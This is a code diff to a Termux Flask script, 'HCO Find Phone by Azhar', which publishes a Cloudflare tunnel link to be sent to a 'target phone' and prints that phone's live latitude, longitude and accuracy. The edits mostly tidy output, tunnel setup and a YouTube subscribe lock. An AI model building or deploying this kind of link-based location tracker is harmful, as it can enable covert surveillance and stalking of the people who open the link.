@@ -1,7 +1,7 @@
 # HCO Find Phone by Azhar - Fully Automatic Termux Version
 # Requirements: Termux, Python3, Flask, cloudflared, Termux:API
 
-import os, subprocess, threading, time, re
+import os, subprocess, threading, time, re, sys
 from flask import Flask, request, render_template_string, jsonify
 
 # Color codes with bold
@@ -17,6 +17,7 @@ CLEAR = "\033[2J\033[H"
 
 locations = {}
 app = Flask(__name__)
+cloudflared_process = None
 
 # ---------------- Flask routes -----------------
 dashboard_template = """
@@ -120,7 +121,7 @@ def start_server():
     import logging
     log = logging.getLogger('werkzeug')
     log.setLevel(logging.ERROR)
-    app.run(host='0.0.0.0', port=5000, debug=False)
+    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
 
 # ---------------- Tool lock + countdown + YouTube -----------------
 def tool_lock_youtube():
@@ -128,25 +129,29 @@ def tool_lock_youtube():
     print(f"{RED}{'='*80}")
     print(f"{RED}{'🔒 TOOL LOCKED 🔒'.center(80)}")
     print(f"{RED}{'Subscribe & click the BELL icon on YouTube 🔔'.center(80)}")
-    print(f"{RED}{'='*80}{RED}\n")
-    print(f"{CYAN}{'Redirecting in:'.center(80)}{CYAN}\n")
-    for i in range(9,0,-1):
-        print(f"{CYAN}{str(i).center(80)}")
+    print(f"{RED}{'='*80}{RESET}\n")
+    print(f"{CYAN}{'Redirecting in:'.center(80)}{RESET}\n")
+    for i in range(9, 0, -1):
+        print(f"{CYAN}{str(i).center(80)}{RESET}")
         time.sleep(1)
-    youtube_url="https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
+        # Clear the previous countdown line
+        sys.stdout.write("\033[F\033[K")
+    
+    youtube_url = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
     try:
-        subprocess.run(["am","start","-a","android.intent.action.VIEW","-d",youtube_url], 
+        subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", "-d", youtube_url], 
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except:
-        print(f"Open YouTube manually: {youtube_url}")
-    input("\nPress ENTER after returning from YouTube...")
+        print(f"{YELLOW}Open YouTube manually: {youtube_url}{RESET}")
+    
+    input(f"\n{YELLOW}Press ENTER after returning from YouTube...{RESET}")
 
 # ---------------- Start cloudflared tunnel and capture URL automatically -----------------
 def start_cloudflared():
     global cloudflare_link
-    cloudflare_link = None
     
     print(f"{YELLOW}Starting Cloudflare tunnel...{RESET}")
+    time.sleep(2)
     
     # Check if cloudflared is installed
     try:
@@ -161,40 +166,48 @@ def start_cloudflared():
         subprocess.run(["pkg", "install", "cloudflared", "-y"], 
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     
-    # Start cloudflared in the background
-    process = subprocess.Popen(["cloudflared", "tunnel", "--url", "http://127.0.0.1:5000"],
-                               stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
-                               text=True, bufsize=1)
-    
-    # Wait for tunnel to be ready and capture URL
-    timeout = 30
-    start_time = time.time()
-    
-    while time.time() - start_time < timeout:
-        line = process.stderr.readline()
-        if not line:
-            time.sleep(0.1)
-            continue
+    # Start cloudflared in the background with nohup to prevent blocking
+    try:
+        # First kill any existing cloudflared processes
+        subprocess.run(["pkill", "-f", "cloudflared"], 
+                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(1)
+        
+        # Start a new cloudflared process with nohup
+        process = subprocess.Popen([
+            "nohup", "cloudflared", "tunnel", "--url", "http://127.0.0.1:5000"
+        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        
+        # Give it time to start
+        time.sleep(5)
+        
+        # Try to get the URL using the cloudflared command
+        try:
+            result = subprocess.run([
+                "timeout", "10", "cloudflared", "tunnel", "--url", "http://127.0.0.1:5000"
+            ], capture_output=True, text=True, timeout=12)
             
-        if "https://" in line:
-            match = re.search(r"(https://[^\s]+\.trycloudflare\.com)", line)
-            if match:
-                cloudflare_link = match.group(1)
-                print(f"{GREEN}Cloudflare tunnel established!{RESET}")
-                break
-                
-        # Also check stdout
-        line2 = process.stdout.readline()
-        if line2 and "https://" in line2:
-            match = re.search(r"(https://[^\s]+\.trycloudflare\.com)", line2)
-            if match:
-                cloudflare_link = match.group(1)
-                print(f"{GREEN}Cloudflare tunnel established!{RESET}")
-                break
-    
-    if not cloudflare_link:
-        print(f"{RED}Could not establish Cloudflare tunnel automatically.{RESET}")
-        print(f"{YELLOW}Please start cloudflared manually with:{RESET}")
+            # Search for the URL in the output
+            for line in result.stderr.split('\n') + result.stdout.split('\n'):
+                if "https://" in line and "trycloudflare.com" in line:
+                    match = re.search(r"(https://[^\s]+\.trycloudflare\.com)", line)
+                    if match:
+                        cloudflare_link = match.group(1)
+                        print(f"{GREEN}Cloudflare tunnel established!{RESET}")
+                        return process
+        except:
+            pass
+        
+        # If automatic detection failed, use manual method
+        print(f"{YELLOW}Could not automatically detect Cloudflare URL.{RESET}")
+        print(f"{YELLOW}Please start cloudflared manually in a new Termux session:{RESET}")
+        print(f"{CYAN}cloudflared tunnel --url http://127.0.0.1:5000{RESET}")
+        print(f"{YELLOW}Then paste the URL here:{RESET}")
+        cloudflare_link = input().strip()
+        
+    except Exception as e:
+        print(f"{RED}Error starting cloudflared: {e}{RESET}")
+        print(f"{YELLOW}Please start cloudflared manually:{RESET}")
         print(f"{CYAN}cloudflared tunnel --url http://127.0.0.1:5000{RESET}")
         print(f"{YELLOW}Then paste the URL here:{RESET}")
         cloudflare_link = input().strip()
@@ -204,8 +217,8 @@ def start_cloudflared():
 # ---------------- Display banner -----------------
 def display_banner():
     os.system(CLEAR)
-    print(f"{RED}{'='*80}")
-    print(f"{RED}{'HCO FIND PHONE BY AZHAR'.center(80)}")
+    print(f"{RED}{'='*80}{RESET}")
+    print(f"{RED}{'HCO FIND PHONE BY AZHAR'.center(80)}{RESET}")
     print(f"{RED}{'='*80}{RESET}\n")
     print(f"{GREEN}{'Send this link to the phone to track location:'.center(80)}{RESET}\n")
     print(f"{CYAN}{cloudflare_link.center(80)}{RESET}\n")
@@ -213,20 +226,22 @@ def display_banner():
     print(f"{MAGENTA}{'Press Ctrl+C to exit'.center(80)}{RESET}\n")
 
 # ---------------- Main -----------------
-if __name__=="__main__":
+if __name__ == "__main__":
     try:
+        # First show tool lock and YouTube redirect
+        tool_lock_youtube()
+        
         # Start Flask server
+        print(f"{YELLOW}Starting server...{RESET}")
         server_thread = threading.Thread(target=start_server, daemon=True)
         server_thread.start()
         
         # Wait a moment for the server to start
-        time.sleep(2)
+        time.sleep(3)
         
         # Start Cloudflare tunnel and capture public URL
+        print(f"{YELLOW}Setting up Cloudflare tunnel...{RESET}")
         cloudflared_process = start_cloudflared()
-        
-        # Tool lock + countdown + YouTube
-        tool_lock_youtube()
         
         # Display banner with the link
         display_banner()
@@ -240,11 +255,14 @@ if __name__=="__main__":
                 if locations['last_update'] > last_location_time:
                     last_location_time = locations['last_update']
                     time_str = time.strftime('%H:%M:%S', time.localtime(locations['last_update']))
-                    print(f"{GREEN}📍 LIVE LOCATION {time_str}")
-                    print(f"{GREEN}Latitude: {locations.get('lat')}")
-                    print(f"{GREEN}Longitude: {locations.get('lon')}")
-                    print(f"{GREEN}Accuracy: {locations.get('accuracy', 'N/A')}m")
+                    print(f"{GREEN}📍 LIVE LOCATION {time_str}{RESET}")
+                    print(f"{GREEN}Latitude: {locations.get('lat')}{RESET}")
+                    print(f"{GREEN}Longitude: {locations.get('lon')}{RESET}")
+                    print(f"{GREEN}Accuracy: {locations.get('accuracy', 'N/A')}m{RESET}")
                     print(f"{BLUE}{'-'*40}{RESET}")
+            else:
+                print(f"{YELLOW}Waiting for target phone to connect...{RESET}")
+                print(f"{BLUE}{'-'*40}{RESET}")
             
             time.sleep(3)
             
@@ -256,3 +274,8 @@ if __name__=="__main__":
         except:
             pass
         print(f"{GREEN}Thank you for using HCO Find Phone!{RESET}")
+    except Exception as e:
+        print(f"{RED}Error: {e}{RESET}")
+        print(f"{YELLOW}Please make sure you have installed all requirements:{RESET}")
+        print(f"{CYAN}pkg install python cloudflared termux-api -y{RESET}")
+        print(f"{CYAN}pip install flask{RESET}")
